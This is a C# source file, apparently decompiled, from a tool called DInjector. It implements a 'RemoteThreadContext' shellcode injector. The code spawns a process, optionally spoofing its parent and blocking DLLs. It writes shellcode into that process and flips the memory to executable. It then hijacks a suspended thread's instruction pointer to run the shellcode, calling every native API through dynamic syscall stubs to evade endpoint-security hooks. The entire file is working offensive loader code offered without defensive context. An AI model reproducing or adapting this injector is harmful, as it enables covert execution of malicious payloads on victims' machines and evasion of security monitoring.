using System;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x02000013 RID: 19
	internal class RemoteThreadContext
	{
		// Token: 0x06000039 RID: 57 RVA: 0x00004A04 File Offset: 0x00002C04
		public static void Execute(byte[] shellcodeBytes, string processImage, int ppid = 0, bool blockDlls = false)
		{
			ref Win32.ProcessThreadsAPI._PROCESS_INFORMATION ptr = SpawnProcess.Execute(processImage, "C:\\Windows\\System32", true, ppid, blockDlls);
			RemoteThreadContext.NtAllocateVirtualMemory ntAllocateVirtualMemory = (RemoteThreadContext.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtAllocateVirtualMemory"), typeof(RemoteThreadContext.NtAllocateVirtualMemory));
			IntPtr hProcess = ptr.hProcess;
			IntPtr zero = IntPtr.Zero;
			IntPtr intPtr = (IntPtr)shellcodeBytes.Length;
			DInvoke.Data.Native.NTSTATUS ntstatus = ntAllocateVirtualMemory(hProcess, ref zero, IntPtr.Zero, ref intPtr, Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE, 4U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadContext) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadContext) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {0}", ntstatus));
			}
			RemoteThreadContext.NtWriteVirtualMemory ntWriteVirtualMemory = (RemoteThreadContext.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtWriteVirtualMemory"), typeof(RemoteThreadContext.NtWriteVirtualMemory));
			IntPtr intPtr2 = Marshal.AllocHGlobal(shellcodeBytes.Length);
			Marshal.Copy(shellcodeBytes, 0, intPtr2, shellcodeBytes.Length);
			uint num = 0U;
			ntstatus = ntWriteVirtualMemory(hProcess, zero, intPtr2, (uint)shellcodeBytes.Length, ref num);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadContext) [+] NtWriteVirtualMemory");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadContext) [-] NtWriteVirtualMemory: {0}", ntstatus));
			}
			Marshal.FreeHGlobal(intPtr2);
			uint num2;
			ntstatus = ((RemoteThreadContext.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(RemoteThreadContext.NtProtectVirtualMemory)))(hProcess, ref zero, ref intPtr, 32U, out num2);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadContext) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadContext) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {0}", ntstatus));
			}
			IntPtr exportAddress = Generic.GetExportAddress(Generic.GetPebLdrModuleEntry("kernel32.dll"), "LoadLibraryA", true);
			RemoteThreadContext.NtCreateThreadEx ntCreateThreadEx = (RemoteThreadContext.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtCreateThreadEx"), typeof(RemoteThreadContext.NtCreateThreadEx));
			IntPtr zero2 = IntPtr.Zero;
			ntstatus = ntCreateThreadEx(out zero2, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, exportAddress, IntPtr.Zero, true, 0, 0, 0, IntPtr.Zero);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadContext) [+] NtCreateThreadEx, LoadLibraryA, CREATE_SUSPENDED");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadContext) [-] NtCreateThreadEx, LoadLibraryA, CREATE_SUSPENDED: {0}", ntstatus));
			}
			Registers.CONTEXT64 context = default(Registers.CONTEXT64);
			context.ContextFlags = Registers.CONTEXT_FLAGS.CONTEXT_CONTROL;
			ntstatus = ((RemoteThreadContext.NtGetContextThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtGetContextThread"), typeof(RemoteThreadContext.NtGetContextThread)))(zero2, ref context);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadContext) [+] NtGetContextThread");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadContext) [-] NtGetContextThread: {0}", ntstatus));
			}
			context.Rip = (ulong)((long)zero);
			ntstatus = ((RemoteThreadContext.NtSetContextThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtSetContextThread"), typeof(RemoteThreadContext.NtSetContextThread)))(zero2, ref context);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadContext) [+] NtSetContextThread");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadContext) [-] NtSetContextThread: {0}", ntstatus));
			}
			RemoteThreadContext.NtResumeThread ntResumeThread = (RemoteThreadContext.NtResumeThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtResumeThread"), typeof(RemoteThreadContext.NtResumeThread));
			uint num3 = 0U;
			ntstatus = ntResumeThread(zero2, ref num3);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadContext) [+] NtResumeThread");
				return;
			}
			Console.WriteLine(string.Format("(RemoteThreadContext) [-] NtResumeThread: {0}", ntstatus));
		}

		// Token: 0x02000066 RID: 102
		// (Invoke) Token: 0x0600010A RID: 266
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, Win32.Advapi32.CREATION_FLAGS dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo, out Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

		// Token: 0x02000067 RID: 103
		// (Invoke) Token: 0x0600010E RID: 270
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

		// Token: 0x02000068 RID: 104
		// (Invoke) Token: 0x06000112 RID: 274
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten);

		// Token: 0x02000069 RID: 105
		// (Invoke) Token: 0x06000116 RID: 278
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x0200006A RID: 106
		// (Invoke) Token: 0x0600011A RID: 282
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

		// Token: 0x0200006B RID: 107
		// (Invoke) Token: 0x0600011E RID: 286
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtResumeThread(IntPtr ThreadHandle, ref uint SuspendCount);

		// Token: 0x0200006C RID: 108
		// (Invoke) Token: 0x06000122 RID: 290
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtGetContextThread(IntPtr hThread, ref Registers.CONTEXT64 lpContext);

		// Token: 0x0200006D RID: 109
		// (Invoke) Token: 0x06000126 RID: 294
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtSetContextThread(IntPtr hThread, ref Registers.CONTEXT64 lpContext);
	}
}
